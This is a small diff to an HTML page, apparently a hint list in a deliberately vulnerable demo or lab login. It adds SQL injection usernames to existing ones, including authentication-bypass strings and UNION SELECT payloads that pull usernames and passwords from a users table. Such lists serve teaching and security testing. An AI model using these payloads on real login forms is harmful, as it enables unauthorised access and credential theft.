@@ -14,6 +14,9 @@
     <ul>
         <li>Username: <code>' OR '1'='1' --</code></li>
         <li>Username: <code>admin' --</code> (empty password)</li>
+        <li>Username: <code>' UNION SELECT 1, 2, 3, 4 FROM users --</code></li>
+        <li>Username: <code>' OR '1'='1' AND 'a'='a' --</code></li>
+        <li>Username: <code>' OR '1'='1' AND 'a'='a' UNION SELECT username, password FROM users --</code></li>q
     </ul>
     <p><a href="/">Back to home</a></p>
 </body>
